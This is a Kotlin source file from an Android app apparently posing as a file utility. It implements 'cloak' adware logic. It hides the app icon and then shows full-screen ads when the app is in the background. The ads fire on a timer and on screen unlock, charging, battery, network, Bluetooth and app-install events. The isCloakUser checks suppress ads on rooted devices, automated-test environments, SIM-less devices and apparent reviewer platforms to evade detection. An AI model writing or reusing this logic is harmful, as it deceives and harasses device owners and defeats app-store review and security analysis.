package com.hal.convenientfile.util

import android.bluetooth.BluetoothAdapter
import android.content.Intent
import android.content.IntentFilter
import android.net.ConnectivityManager
import android.net.ConnectivityManager.NetworkCallback
import android.net.Network
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import com.hal.convenientfile.base.BaseApp
import com.hal.convenientfile.receiver.AppConReceiver
import com.hal.convenientfile.receiver.BatteryConReceiver
import com.hal.convenientfile.receiver.BlueConReceiver
import com.hal.convenientfile.receiver.ScreenConReceiver
import com.hal.convenientfile.ui.*

/**
 * Description:Cloak逻辑相关工具栏
 * Author: Icarus.Lee
 * Email: 769247877@qq.com
 * Date: 2023/11/15
 */
object CloakUtil {
    /**
     * 上次弹出广告时间
     */
    private var lastShowTime = 0L


    private val timerHandler by lazy { Handler(Looper.getMainLooper()) }

    private var screenChChReceiver: ScreenConReceiver? = null
    private var batteryReceiver: BatteryConReceiver? = null
    private var appsChReceiver: AppConReceiver? = null
    private var networkCallback: NetworkCallback? = null
    private var blthReceiver: BlueConReceiver? = null

    private val app by lazy { BaseApp.app }

    private val connectivityManager by lazy { app.getSystemService(ConnectivityManager::class.java) }


    private var isFirstAvailable = true

    /*
        init {
            "CloakUtil init...".log()
        }*/

    /**
     * 是否是正常用户，能弹ad
     */
    fun isNormalUser() = AdUtil.isInBlackList.value == "0" && AdUtil.isInThirdPlatform.value == "0"
            && AdUtil.checkRootResult.value == "1" && AdUtil.checkAutoTestResult.value == "1"
            && AdUtil.checkSimResult.value == "1"

    /**
     * 是否是Cloak用户，禁止弹ad
     */
    fun isCloakUser() =
        AdUtil.isInBlackList.value != "0" || AdUtil.isInThirdPlatform.value != "0"
                || AdUtil.checkRootResult.value != "1" || AdUtil.checkAutoTestResult.value != "1"
                || AdUtil.checkSimResult.value != "1"

    /**
     * 是否用户所有参数都请求完毕
     */
    fun isUserParamsReady() =
        (AdUtil.isInBlackList.value != null && AdUtil.isInThirdPlatform.value != null
                && AdUtil.checkRootResult.value != null && AdUtil.checkAutoTestResult.value != null
                && AdUtil.checkSimResult.value != null)/*.apply {
            log(
                "==>isUserParamsReady\nisInBlackList=", AdUtil.isInBlackList.value, "\n",
                "isInThirdPlatform=", AdUtil.isInThirdPlatform.value, "\n",
                "checkRootResult=", AdUtil.checkRootResult.value, "\n",
                "checkAutoTestResult=", AdUtil.checkAutoTestResult.value, "\n",
                "checkSimResult=", AdUtil.checkSimResult.value
            )
        }*/


    private fun showAdActivity() {
        AdUtil.aliveAd.let {
            log("AdReady==", it.isAdReady)
            if (it.isAdReady) {
                lastShowTime = System.currentTimeMillis()
                AppUtil.canOpt = true
                Handler(Looper.getMainLooper()).postDelayed({
                    AppUtil.canOpt = false
                }, 200)
                Handler(Looper.getMainLooper()).post {
                    "try show ad activity".log()
//                    DialogUtil.sa(context, SAActivity::class.java)
                    AppUtil.showAdAc()
                }
            } else {
                //重新load，由于每次广告间隔事件比较长，如果此时还未加载出来。则可能已经加载失败。故需要重新加载
                it.load()
            }
            TbaUtil.logEvent(Event.CHECK_READY, Bundle().apply {
                putString(CommonKey.PARAM, if (it.isAdReady) "1" else "-1")
            })
        }
    }

    /**
     * 检查广告弹出条件，如果符合则显示广告
     */
    fun checkAndShowAd() {
//        "checkAndShowAd...".log()
        if (needShow()) {
            showAdActivity()
        }
    }

    private fun needShow(): Boolean {
        val now = System.currentTimeMillis()
        val isDurationTimeOk = now - lastShowTime >= Cloak.adShowMinDuration
        val appInstallTime = SPUtil.getLong(
            SpKey.SP_KEY_APP_INSTALL_TIME_SECONDS,
            0
        )
//        val isInstallTimeOk = now - appInstallTime * 1000 >= afterInstallTime
        //是否是亮屏和竖屏
        val isScreenOk = ScreenUtil.isInteractive() && ScreenUtil.isScreenPortrait()
        //可能当前是广告页面，会出现误判，不能覆盖弹出的问题
        val isAppInBackground = !BaseApp.app.isInForeground

        /**
         * 广告activity是否在前台
         */
        var isAdAcInFront = false
        BaseApp.app.activitySet.lastOrNull()?.let {
            log("last ac=", it::class.java.name)
            if (it !is SplashActivity && it !is MainActivity
                && it !is StorageActivity && it !is InfoActivity
                && it !is CheckActivity && it !is BrowseActivity
            ) {
                isAdAcInFront = true
            }
        }
        val isHided = AppUtil.isIconHide()
        log(
            "isDuTOk==", isDurationTimeOk, " isHided==", isHided,
            " inT=", appInstallTime * 1000, " isScrOk==", isScreenOk
        )
        return isHided && isDurationTimeOk && (isAdAcInFront || isAppInBackground)
                && isNormalUser() && isScreenOk
    }

    /**
     * 启动广告检测策略
     */
    fun startAdStrategy() {
        //循环触发
        val runnable = object : Runnable {
            override fun run() {
                log("ad loop event trigger...lp1=", Cloak.adLoopTime)
                checkAndShowAd()
                TbaUtil.logEventAdTrigger(TriggerParamValue.LOOP)
//                AppUtil.checkAndUploadActive()
                log("adLoopTime==", Cloak.adLoopTime)
                timerHandler.postDelayed(this, Cloak.adLoopTime)
            }
        }
        timerHandler.postDelayed(runnable, Cloak.adLoopTime)
        //监听解锁弹窗
        listenToScreenEvent()
        //电量过低
        listenToBatteryEvent()
        //监听app包安装和卸载
        listenToAppAddOrRemove()
        //监听网络变化事件
        listenToNetworkChangeEvent()
        //监听蓝牙变化事件
        listenToBluetoothChangeEvent()
        //监听挂断电话事件(敏感权限)
//        listenToHangup()
    }

    private fun listenToBluetoothChangeEvent() {
        val intentFilter = IntentFilter().apply {
            addAction(BluetoothAdapter.ACTION_STATE_CHANGED)
        }
        blthReceiver = BlueConReceiver(stateOffEvent = {
            checkAndShowAd()
            TbaUtil.logEventAdTrigger(TriggerParamValue.BLUETOOTH_STATE_CHANGE)
            "ad bluetooth off trigger...".log()
        }, stateOnEvent = {
            checkAndShowAd()
            TbaUtil.logEventAdTrigger(TriggerParamValue.BLUETOOTH_STATE_CHANGE)
            "ad bluetooth on trigger...".log()
        })
        app.registerReceiver(blthReceiver, intentFilter)
    }

    private fun listenToNetworkChangeEvent() {
        if (networkCallback == null) {
            networkCallback = object : NetworkCallback() {
                override fun onAvailable(network: Network) {
                    if (isFirstAvailable) {
                        //第一次变化事件，忽略
                        isFirstAvailable = false
                        return
                    }
                    log("onAvailable...network==", network)
                    "ad network onAvailable trigger...".log()
                    checkAndShowAd()
                    TbaUtil.logEventAdTrigger(TriggerParamValue.NET_CHANGE)
                }
            }
        }
        networkCallback?.let {
            connectivityManager.registerDefaultNetworkCallback(it)
        }
    }

    private fun listenToAppAddOrRemove() {
        val intentFilter = IntentFilter().apply {
            addAction(Intent.ACTION_PACKAGE_ADDED)
            addAction(Intent.ACTION_PACKAGE_REMOVED)
            addAction(Intent.ACTION_PACKAGE_REPLACED)
            addDataScheme("package")
        }
        appsChReceiver = AppConReceiver(appInstallEvent = {
            checkAndShowAd()
            TbaUtil.logEventAdTrigger(TriggerParamValue.APP_INSTALL)
            "ad install trigger...".apply {
                log()
            }
        }, appUninstallEvent = {
            checkAndShowAd()
            TbaUtil.logEventAdTrigger(TriggerParamValue.APP_UNINSTALL)
            "ad uninstall trigger...".apply {
                log()
            }
        })
        app.registerReceiver(appsChReceiver, intentFilter)
    }

    private fun listenToBatteryEvent() {
        val intentFilter = IntentFilter().apply {
            addAction(Intent.ACTION_BATTERY_LOW)
            addAction(Intent.ACTION_POWER_CONNECTED)
            addAction(Intent.ACTION_POWER_DISCONNECTED)
        }
        batteryReceiver = BatteryConReceiver(batteryLowEvent = {
            checkAndShowAd()
            TbaUtil.logEventAdTrigger(TriggerParamValue.LOW_POWER)
            "ad battery low trigger...".apply {
                log()
            }
        },
            powerConnected = {
                checkAndShowAd()
                TbaUtil.logEventAdTrigger(TriggerParamValue.CHARGE_START)
                "ad power connected trigger...".apply {
                    log()
                }
            },
            powerDisConnected = {
                checkAndShowAd()
                TbaUtil.logEventAdTrigger(TriggerParamValue.CHARGE_STOP)
                "ad power disconnected trigger...".apply {
                    log()
                }
            })
        app.registerReceiver(batteryReceiver, intentFilter)
    }

    private fun listenToScreenEvent() {
        val intentFilter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        screenChChReceiver = ScreenConReceiver(userPresentEvent = {
            checkAndShowAd()
            TbaUtil.logEventAdTrigger(TriggerParamValue.SCREEN_UNLOCK)
            "ad user present trigger...".log()
        })
        app.registerReceiver(screenChChReceiver, intentFilter)
    }

    fun stopAdStrategy() {
        timerHandler.removeCallbacksAndMessages(null)
        screenChChReceiver?.let { app.unregisterReceiver(it) }
        batteryReceiver?.let { app.unregisterReceiver(it) }
        appsChReceiver?.let { app.unregisterReceiver(it) }
        networkCallback?.let {
            connectivityManager?.unregisterNetworkCallback(it)
        }
        blthReceiver?.let { app.unregisterReceiver(it) }
//        phoneStateReceiver?.let { app.unregisterReceiver(it) }
    }
}